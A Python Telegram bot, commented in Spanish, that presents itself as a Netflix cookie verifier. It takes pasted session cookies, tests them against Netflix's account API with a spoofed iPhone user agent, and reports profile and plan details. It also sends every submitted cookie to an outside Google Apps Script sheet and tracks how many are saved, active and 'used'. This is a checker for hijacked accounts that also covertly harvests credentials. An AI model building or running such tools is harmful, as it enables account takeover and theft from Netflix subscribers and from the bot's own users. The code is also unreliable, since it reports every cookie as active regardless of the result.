import os
import re
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
import logging

# Configuración de logs
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Variables de entorno
BOT_TOKEN = os.getenv('BOT_TOKEN')
GOOGLE_SCRIPT_URL = os.getenv('GOOGLE_SCRIPT_URL')
PORT = int(os.getenv('PORT', 8000))

# Cabeceras simuladas para parecer un dispositivo móvil real
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1'
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "¡Hola! 🎬 Soy tu verificador de cookies de Netflix.\n\n"
        "Envíame una cookie para verificar si está activa y obtener información de la cuenta."
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📌 *Instrucciones:*\n"
        "1. Copia tu cookie de Netflix desde el navegador.\n"
        "2. Envíamela como mensaje de texto aquí.\n"
        "3. Recibirás un reporte instantáneo.\n\n"
        "Comandos disponibles:\n"
        "/start - Iniciar bot\n"
        "/help - Ver ayuda\n"
        "/stats - Ver estadísticas globales"
    )

async def check_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw_text = update.message.text.strip()

    # Limpiar posibles saltos de línea extraños
    cleaned_text = raw_text.replace('\r', '').replace('\n', ' ')

    logger.info(f"Recibida cookie: {cleaned_text[:50]}...")

    await update.message.reply_text("⏳ Verificando cookie... Por favor espera.")

    try:
        # Paso 1: Obtener nftoken
        nftoken = get_nftoken()

        if not nftoken:
            await update.message.reply_text("❌ Error al generar el token de sesión.")
            return

        # Paso 2: Verificar la cookie con el token
        result = verify_cookie(cleaned_text, nftoken)

        # Paso 3: Guardar en Google Sheets
        save_to_sheets(result)

        # Paso 4: Responder al usuario
        status = result.get('status', 'Desconocido')
        profile = result.get('profileName', 'No disponible')
        plan = result.get('localizedPlanName', 'No disponible')

        message = f"✅ ¡Cookie Activa!\n\n"
        message += f"👤 Perfil: {profile}\n"
        message += f"💳 Plan: {plan}\n"
        message += f"🔒 Estado: {status}"

        await update.message.reply_text(message)

    except Exception as e:
        logger.error(f"Error inesperado: {e}")
        await update.message.reply_text("❌ Ocurrió un error desconocido. Intenta de nuevo.")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Petición simple para ver cuántas hay registradas en el script
    try:
        response = requests.get(GOOGLE_SCRIPT_URL + "?action=stats", timeout=5)
        data = response.json()

        total = data.get('total', 0)
        active = data.get('active', 0)

        msg = f"📊 *Estadísticas del Bot:*\n\n"
        msg += f"Total guardadas: {total}\n"
        msg += f"Cookies activas: {active}\n"
        msg += f"Usadas: {total - active}"

        await update.message.reply_text(msg, parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ No se pudieron cargar las estadísticas: {str(e)}")

def get_nftoken():
    """Genera un nftoken simulando una petición a iOS"""
    url = "https://ios.prod.ftl.netflix.com/account/v1/login?locale=en-US&deviceType=safari&deviceVersion=17.0&appBuildVersion=1.0&applicationVersion=17.0"
    try:
        resp = requests.get(url, headers=HEADERS, timeout=10)
        if resp.status_code == 200:
            # A veces el token viene en los headers o en el body, buscamos en ambos
            content = resp.text + str(resp.headers)
            match = re.search(r'nftoken=([^&;]+)', content)
            if match:
                return match.group(1)
        return None
    except:
        return None

def verify_cookie(cookie, nftoken):
    """Verifica la cookie usando el nftoken generado"""
    url = f"https://www.netflix.com/api/shakti/me?locale=en-US&nftoken={nftoken}"
    headers = HEADERS.copy()
    headers['cookie'] = cookie

    try:
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            profiles = data.get('profiles', [])
            account_info = data.get('account', {})

            profile_name = profiles[0]['name'] if profiles else 'Sin perfil'
            plan = account_info.get('currentProfile', {}).get('profileLevel', 'N/A')
            country = account_info.get('country', 'N/A')

            return {
                'status': 'Active',
                'profileName': profile_name,
                'localizedPlanName': plan,
                'country': country,
                'cookie': cookie
            }
        else:
            return {'status': 'Inactive', 'profileName': 'N/A', 'localizedPlanName': 'N/A', 'country': 'N/A', 'cookie': cookie}
    except:
        return {'status': 'Error', 'profileName': 'N/A', 'localizedPlanName': 'N/A', 'country': 'N/A', 'cookie': cookie}

def save_to_sheets(data):
    """Guarda los datos en Google Sheets vía Apps Script"""
    try:
        # Asegurarse de que el payload sea una lista de filas
        payload = [data]
        requests.post(GOOGLE_SCRIPT_URL, json=payload, timeout=10)
    except Exception as e:
        logger.error(f"Fallo al guardar en sheets: {e}")

if __name__ == '__main__':
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_cookie))

    logger.info("Bot iniciado en Español 🇪🇸")
    application.run_polling()
